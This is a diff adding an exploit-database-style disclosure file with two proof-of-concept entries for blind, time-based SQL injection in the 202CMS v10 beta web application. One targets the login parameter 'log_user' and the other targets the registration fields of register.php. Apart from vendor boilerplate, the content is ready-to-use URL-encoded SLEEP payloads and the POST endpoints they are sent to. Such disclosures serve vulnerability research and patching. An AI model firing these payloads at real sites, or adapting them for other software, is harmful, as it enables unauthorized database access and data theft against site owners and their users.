@@ -1,0 +1,50 @@
+===========================================================================================
+# Exploit Title: 202CMS - 'log_user' SQL Inj.
+# Dork: N/A
+# Date: 20-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://sourceforge.net/projects/b202cms/
+# Software Link: https://sourceforge.net/projects/b202cms/
+# Version: v10 beta
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: 202CMS is small, but functionally CMS. It is based
+on Twitter Bootstrap
+  This CMS was built by Konrad and is powered by MySQLi and PHP. 202CMS is
+highly customizable
+  and extremely easy to setup. The script is not finished, but soon I'm
+going to finish it.
+===========================================================================================
+# POC - SQLi (blind)
+# Parameters : log_user
+# Attack Pattern :
+1+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f
+# POST Method : http://localhost/202cms10beta/index.php
+===========================================================================================
+###########################################################################################
+===========================================================================================
+# Exploit Title: 202CMS - 'register.php' SQL Inj.
+# Dork: N/A
+# Date: 20-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://sourceforge.net/projects/b202cms/
+# Software Link: https://sourceforge.net/projects/b202cms/
+# Version: v10 beta
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: 202CMS is small, but functionally CMS. It is based
+on Twitter Bootstrap
+  This CMS was built by Konrad and is powered by MySQLi and PHP. 202CMS is
+highly customizable
+  and extremely easy to setup. The script is not finished, but soon I'm
+going to finish it.
+===========================================================================================
+# POC - SQLi (blind)
+# Parameters : register.php, reg_user,reg_mail
+# Attack Pattern :
+1+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f
+# Attack Pattern : %27%2b((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2b%27
+# POST Method : http://localhost/202cms10beta/register.php
+===========================================================================================
